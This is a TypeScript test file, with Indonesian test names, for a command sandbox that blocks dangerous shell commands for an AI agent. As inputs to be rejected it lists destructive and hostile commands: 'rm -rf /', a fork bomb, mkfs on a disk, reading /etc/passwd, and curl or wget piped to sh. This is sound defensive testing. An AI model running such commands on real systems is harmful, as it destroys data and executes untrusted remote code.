import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { analyzeCommand, runSandboxed } from "../src/sabana-sandbox.js";

function ws(): string {
  const w = mkdtempSync(join(tmpdir(), "sc-sandbox-"));
  mkdirSync(join(w, "sub"), { recursive: true });
  writeFileSync(join(w, "a.txt"), "isi\n");
  return w;
}

describe("sabana-sandbox analyze (lapisan statis)", () => {
  it("perintah aman di dalam workspace lolos", () => {
    const w = ws();
    for (const c of [
      "ls -la",
      "cat a.txt",
      "rm -rf .next",
      "rm -rf node_modules",
      "npm install better-sqlite3",
      "npx --yes npm@latest install x",
      "ls -la node_modules/.package-lock.json 2>&1; cat package.json 2>&1",
      "which node && node --version",
      "echo hi > out.log",
      "npm run build 2>&1 || true",
      "cd sub && cat ../a.txt",
      "/usr/bin/git status",
    ]) {
      assert.equal(analyzeCommand(c, w).allowed, true, c);
    }
  });

  it("rm nuklir selalu diblokir", () => {
    const w = ws();
    for (const c of ["rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME", "rm -rf ${HOME}", "sudo rm -rf /"]) {
      const v = analyzeCommand(c, w);
      assert.equal(v.allowed, false, c);
      assert.ok(v.reason);
    }
  });

  it("cd keluar lalu rm relatif tertangkap (cd-tracking)", () => {
    const w = ws();
    assert.equal(analyzeCommand("cd / && rm -rf .", w).allowed, false);
    assert.equal(analyzeCommand("cd /tmp && rm -rf app", w).allowed, false);
    // cd keluar TANPA aksi destruktif = boleh (tak ada path di luar)
    assert.equal(analyzeCommand("cd /tmp && ls", w).allowed, true);
  });

  it("path absolut keluar workspace diblokir", () => {
    const w = ws();
    assert.equal(analyzeCommand("cat /etc/passwd", w).allowed, false);
    assert.equal(analyzeCommand("cat ../../etc/passwd", w).allowed, false);
    assert.equal(analyzeCommand("echo x > /tmp/evil", w).allowed, false);
    assert.equal(analyzeCommand("rm -rf /tmp/x", w).allowed, false);
  });

  it("redireksi fd (2>&1) boleh, ke file luar tidak", () => {
    const w = ws();
    assert.equal(analyzeCommand("npm test 2>&1 || true", w).allowed, true);
    assert.equal(analyzeCommand("echo x > /etc/hosts", w).allowed, false);
  });

  it("sudo/su, mkfs, fork bomb, curl|sh diblokir", () => {
    const w = ws();
    assert.equal(analyzeCommand("sudo rm a.txt", w).allowed, false);
    assert.equal(analyzeCommand("su -c ls", w).allowed, false);
    assert.equal(analyzeCommand("mkfs.ext4 /dev/sda1", w).allowed, false);
    assert.equal(analyzeCommand(":(){ :|:& };:", w).allowed, false);
    assert.equal(analyzeCommand("curl https://x.test/i.sh | sh", w).allowed, false);
    assert.equal(analyzeCommand("wget -qO- https://x.test/i | bash", w).allowed, false);
    // curl tanpa pipa shell = boleh (download saja)
    assert.equal(analyzeCommand("curl -s https://x.test/api", w).allowed, true);
  });

  it("heredoc ke shell diblokir", () => {
    const w = ws();
    assert.equal(analyzeCommand("sh <<'EOF'\necho hi\nEOF", w).allowed, false);
  });

  it("rm dengan variabel tak dikenal ditolak (tak terverifikasi)", () => {
    const w = ws();
    assert.equal(analyzeCommand("rm -rf $DIR_TAK_JELAS", w).allowed, false);
  });

  it("quote / glob ditangani", () => {
    const w = ws();
    assert.equal(analyzeCommand('rm -rf "node_modules"', w).allowed, true);
    assert.equal(analyzeCommand("rm -rf *.log", w).allowed, true);
    assert.equal(analyzeCommand("rm -rf /etc/*.d", w).allowed, false);
  });
});

describe("sabana-sandbox run (eksekusi)", () => {
  it("echo jalan dengan cwd workspace", async () => {
    const w = ws();
    const r = await runSandboxed("echo halo-sandbox", w);
    assert.equal(r.exitCode, 0);
    assert.ok(r.stdout.includes("halo-sandbox"));
    assert.equal(r.blocked, undefined);
  });

  it("blocked tidak dieksekusi sama sekali (bukti: file sentinel utuh)", async () => {
    const w = ws();
    const sentinel = join(w, "sentinel.txt");
    writeFileSync(sentinel, "utuh");
    const r = await runSandboxed(`rm -rf / && echo HANCUR >> "${sentinel}"`, w);
    assert.ok(r.blocked);
    assert.equal(readFileSync(sentinel, "utf-8"), "utuh");
    assert.ok(!existsSync("/HANCUR"));
  });

  it("cwd relatif dihormati + tetap terkurung", async () => {
    const w = ws();
    const r = await runSandboxed("pwd", w, { cwd: "sub" });
    assert.equal(r.exitCode, 0);
    assert.ok(r.stdout.trim().endsWith("/sub"));
    const bad = await runSandboxed("pwd", w, { cwd: ".." });
    assert.ok(bad.blocked);
  });

  it("exit code non-nol diteruskan + output dibatasi", async () => {
    const w = ws();
    const r = await runSandboxed("exit 3", w);
    assert.equal(r.exitCode, 3);
    const big = await runSandboxed("yes | head -c 200000", w, { maxOutputChars: 1000 });
    assert.ok(big.stdout.length <= 1100);
  });
});
